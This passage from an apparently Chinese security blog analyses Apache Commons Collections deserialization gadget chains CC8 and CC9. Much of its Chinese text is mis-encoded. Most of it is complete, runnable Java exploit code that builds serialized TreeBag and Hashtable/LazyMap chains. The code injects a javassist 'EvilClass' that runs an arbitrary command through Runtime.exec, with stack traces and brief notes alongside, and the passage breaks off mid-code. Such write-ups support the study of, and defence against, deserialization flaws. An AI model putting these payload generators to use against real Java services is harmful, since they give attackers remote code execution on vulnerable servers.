objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ç”±äº <code>Hashtable#put</code> ä¹Ÿä¼šè°ƒç”¨ <code>entry.key.equals</code> æ–¹æ³•å¯¼è‡´åˆ©ç”¨é“¾è¢«è§¦å‘ä¸€æ¬¡ï¼Œå› æ­¤éœ€è¦å°†è°ƒç”¨ <code>LazyMap#get</code> æ—¶åŠ å…¥çš„ <code>key</code> å»æ‰ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦å¤– <code>Hashtable#put</code> è°ƒç”¨çš„ <code>entry.key.equals</code> éœ€è¦è¿”å› <code>false</code> æ‰èƒ½æŠŠç¬¬äºŒä¸ªé”®å€¼å¯¹æ”¾å…¥ <code>Hashtable</code>ã€‚åœ¨ <code>AbstraceMap#equals</code> ä¸­ï¼Œå¦‚æœ <code>value</code> ä¸º <code>null</code> çš„è¯åªéœ€è¦è®© <code>m.get(key)</code> è¿”å›ä¸ä¸º <code>null</code> å³å¯ã€‚è€Œ <code>transformer</code> æ–¹æ³•è¿”å›ä¸ä¸º <code>null</code> å¾ˆå®¹æ˜“æ»¡è¶³ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Entry&lt;K,V&gt; e = i.next();</span><br><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line"><span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line"><span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="CC8"><a href="#CC8" class="headerlink" title="CC8"></a>CC8</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:185)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:414)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:64)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(NativeConstructorAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">at java.lang.reflect.Constructor.newInstance(Constructor.java:422)</span><br><span class="line">at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:116)</span><br><span class="line">at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:32)</span><br><span class="line">at org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)</span><br><span class="line">at java.util.TreeMap.compare(TreeMap.java:1291)</span><br><span class="line">at java.util.TreeMap.put(TreeMap.java:538)</span><br><span class="line">at org.apache.commons.collections4.bag.AbstractMapBag.doReadObject(AbstractMapBag.java:524)</span><br><span class="line">at org.apache.commons.collections4.bag.TreeBag.readObject(TreeBag.java:129)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æï¼ˆTreeBagâ†’TransformingComparatorï¼‰"><a href="#åŸç†åˆ†æï¼ˆTreeBagâ†’TransformingComparatorï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆTreeBagâ†’TransformingComparatorï¼‰"></a>åŸç†åˆ†æï¼ˆTreeBagâ†’TransformingComparatorï¼‰</h4><p>æœ¬è´¨å°±æ˜¯ CC2ï¼ˆCC4ï¼‰ï¼Œåªä¸è¿‡æŠŠ <code>PriorityQueue</code> æ¢æˆäº† <code>TreeBag</code>ã€‚</p>
<h4 id="åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰-2"><a href="#åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰-2" class="headerlink" title="åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰"></a>åˆ©ç”¨ä»£ç ï¼ˆCC4ï¼‰</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">tree</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(comparator);</span><br><span class="line">        tree.add(TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;transformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tree;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CC9"><a href="#CC9" class="headerlink" title="CC9"></a>CC9</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:185)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:414)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:64)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(NativeConstructorAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">at java.lang.reflect.Constructor.newInstance(Constructor.java:422)</span><br><span class="line">at org.apache.commons.collections.functors.InstantiateTransformer.transform(InstantiateTransformer.java:106)</span><br><span class="line">at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:158)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:74)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode(TiedMapEntry.java:121)</span><br><span class="line">at java.util.Hashtable.reconstitutionPut(Hashtable.java:1218)</span><br><span class="line">at java.util.Hashtable.readObject(Hashtable.java:1195)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æï¼ˆHashTableâ†’TiedMapEntryâ†’LazyMapï¼‰"><a href="#åŸç†åˆ†æï¼ˆHashTableâ†’TiedMapEntryâ†’LazyMapï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆHashTableâ†’TiedMapEntryâ†’LazyMapï¼‰"></a>åŸç†åˆ†æï¼ˆHashTableâ†’TiedMapEntryâ†’LazyMapï¼‰</h4><p>åœ¨ CC6 çš„åŸºç¡€ä¸ŠæŠŠ <code>HashMap</code> æ›¿æ¢ä¸º <code>HashTable</code>ã€‚</p>
<h4 id="åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-5"><a href="#åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-5" class="headerlink" title="åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰"></a>åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections9</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, TrAXFilter.class);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        table.put(entry, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(outerMap, <span class="string">&quot;factory&quot;</span>, <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        ctClass.makeClassInitializer()</span><br><span class="line">                .setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span 